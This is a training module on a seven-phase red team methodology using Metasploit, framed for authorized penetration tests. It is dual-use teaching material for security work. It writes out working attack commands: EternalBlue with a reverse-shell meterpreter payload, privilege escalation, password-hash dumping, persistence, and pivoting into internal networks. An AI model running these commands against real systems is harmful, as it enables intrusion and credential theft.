# Module 16 — Real Red Team Methodology (1)

> 🔴 **Advanced Level** | How professional red teamers use Metasploit in authorized engagements
> 

---

# 🎯 Real Red Team Methodology

> All techniques described are for **authorized penetration testing engagements only.**
> 

---

## 🗺️ The 7-Phase Red Team Process

```
Phase 1: Pre-Engagement
      │
Phase 2: Reconnaissance
      │
Phase 3: Scanning & Enumeration
      │
Phase 4: Exploitation
      │
Phase 5: Post-Exploitation
      │
Phase 6: Pivoting & Lateral Movement
      │
Phase 7: Reporting & Remediation
```

---

## 📋 Phase 1: Pre-Engagement

```bash
# Before touching any system:
# 1. Signed Rules of Engagement (ROE)
# 2. Scope document (which IPs/domains are in scope)
# 3. Emergency contact for client
# 4. Start/end times agreed
# 5. Notification emails sent

# Set up Metasploit workspace:
msfconsole -q
msf6 > workspace -a CLIENT_NAME_$(date +%Y%m%d)
msf6 > workspace CLIENT_NAME_20260314

# Set global LHOST:
msf6 > setg LHOST 192.168.1.10
```

---

## 🔍 Phase 2: Reconnaissance

```bash
# Passive recon (no direct contact with target):
# - WHOIS, DNS lookups
# - Google dorking
# - Shodan (shodan.io) for internet-facing assets
# - LinkedIn for employee info

# Active recon via MSF:
msf6 > use auxiliary/gather/dns_enum
msf6 auxiliary(gather/dns_enum) > set DOMAIN target.com
msf6 auxiliary(gather/dns_enum) > run

msf6 > use auxiliary/gather/shodan_search
msf6 auxiliary(gather/shodan_search) > set SHODAN_APIKEY [your_key]
msf6 auxiliary(gather/shodan_search) > set QUERY "hostname:target.com"
msf6 auxiliary(gather/shodan_search) > run
```

---

## 🔍 Phase 3: Scanning & Enumeration

```bash
# Full network scan:
msf6 > db_nmap -sV -A -p 1-65535 192.168.1.0/24 --open

# Review results:
msf6 > hosts
msf6 > services

# Targeted service enumeration:
# SMB:
msf6 > use auxiliary/scanner/smb/smb_version
msf6 auxiliary(scanner/smb/smb_version) > hosts -R
msf6 auxiliary(scanner/smb/smb_version) > run

# HTTP:
msf6 > use auxiliary/scanner/http/http_version
msf6 auxiliary(scanner/http/http_version) > services -p 80 -R
msf6 auxiliary(scanner/http/http_version) > run

# SSH:
msf6 > use auxiliary/scanner/ssh/ssh_version
msf6 auxiliary(scanner/ssh/ssh_version) > services -p 22 -R
msf6 auxiliary(scanner/ssh/ssh_version) > run

# Vulnerability scanning:
msf6 > use auxiliary/scanner/smb/smb_ms17_010
msf6 auxiliary(scanner/smb/smb_ms17_010) > hosts -R
msf6 auxiliary(scanner/smb/smb_ms17_010) > run
```

---

## 💥 Phase 4: Exploitation

```bash
# Prioritize exploits by:
# 1. Reliability (rank: excellent > great > good)
# 2. Privilege gained (root/SYSTEM > user)
# 3. Stability (no crashes)

# Target high-value, reliable exploits first:
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 exploit > set RHOSTS [target]
msf6 exploit > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 exploit > set LHOST 192.168.1.10
msf6 exploit > exploit -j

# Document every exploitation attempt:
# - Module used
# - Target IP and port
# - Payload
# - Success/failure
# - Time and date
# - Evidence (screenshot)
```

---

## 🔑 Phase 5: Post-Exploitation

```bash
# On each session, immediately:
meterpreter > sysinfo
meterpreter > getuid
meterpreter > getsystem
meterpreter > hashdump

# Gather evidence:
meterpreter > screenshot
meterpreter > run post/multi/recon/local_exploit_suggester
meterpreter > run post/windows/gather/enum_applications
meterpreter > run post/windows/gather/enum_domain

# Migrate to stable process:
meterpreter > migrate -N explorer.exe

# Set persistence (if allowed by scope):
meterpreter > run post/windows/manage/persistence
```

---

## 🔀 Phase 6: Pivoting

```bash
# Compromised host can reach internal network:
meterpreter > ipconfig
# Interface 2: 10.10.10.5/24 (internal subnet!)

# Add route through this session:
msf6 > route add 10.10.10.0/24 [session_id] 

# Set up SOCKS proxy: 
msf6 > use auxiliary/server/socks_proxy
msf6 auxiliary(server/socks_proxy) > set VERSION 5
msf6 auxiliary(server/socks_proxy) > set SRVPORT 1080 
msf6 auxiliary(server/socks_proxy) > run -j

# Edit proxychains config:
echo "socks5 127.0.0.1 1080" >> /etc/proxychains4.conf

# Now scan internal network through pivot:
proxychains nmap -sT 10.10.10.0/24 

# Exploit internal hosts:
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 exploit > set RHOSTS 10.10.10.50  # Internal host!
msf6 exploit > run  # Routes through pivot automatically!
```

---

## 📝 Phase 7: Reporting

```bash
# Export all data from MSF database:
msf6 > db_export -f xml /tmp/pentest_final.xml 

# Review all findings:
msf6 > hosts
msf6 > services
msf6 > vulns
msf6 > creds
msf6 > loot 
```

### Professional Report Structure:

```
1. EXECUTIVE SUMMARY
   - Business risk summary
   - Number of critical findings
   - Overall risk rating

2. TECHNICAL FINDINGS
   For each exploit success:
   - Host and Service
   - Vulnerability (CVE)
   - Exploit Used
   - Access Gained
   - Data/Screenshots as Evidence
   - CVSS Score
   - Remediation Steps

3. ATTACK PATH DIAGRAM
   Show how far penetration reached

4. REMEDIATION ROADMAP
   - Critical (immediate)
   - High (1 week)
   - Medium (1 month)

5. APPENDIX
   Raw MSF output, Nmap results, screenshots
```

---

> ✅ **Red Team methodology complete! Final module: Blue Team Detection.**
> 

[Module 15 — Practical Labs — Metasploitable2](Module%2016%20%E2%80%94%20Real%20Red%20Team%20Methodology%20(1)/Module%2015%20%E2%80%94%20Practical%20Labs%20%E2%80%94%20Metasploitable2%2066fac6b1822b83b38f82817684cddec6.md)